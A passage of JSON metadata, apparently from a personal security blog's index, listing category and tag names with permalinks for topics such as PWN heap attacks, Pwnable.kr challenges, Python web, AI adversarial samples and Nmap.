g404.github.io/Categories/PWN/Heap/Heap-Attack/"},{"name":"Python","slug":"Python","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/Python/"},{"name":"Web","slug":"Python/Web","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/Python/Web/"},{"name":"Pwnable.kr","slug":"PWN/Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/"},{"name":"Toddler's Bottle","slug":"PWN/Pwnable-kr/Toddler-s-Bottle","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/Toddler-s-Bottle/"},{"name":"AI","slug":"AI","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/AI/"},{"name":"Adversarial sample","slug":"AI/Adversarial-sample","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/AI/Adversarial-sample/"},{"name":"Heap_Basic","slug":"PWN/Heap/Heap-Basic","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Heap/Heap-Basic/"}],"tags":[{"name":"TensorFlow2.0","slug":"TensorFlow2-0","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/TensorFlow2-0/"},{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"},{"name":"Stack","slug":"Stack","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/Stack/"},{"name":"C","slug":"C","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/C/"},{"name":"Linux","slug":"Linux","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/Linux/"},{"name":"Python","slug":"Python","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/Python/"},{"name":"Nmap","slug":"Nmap","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/Nmap/"},{"name":"AI","slug":"AI","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/AI/"}]}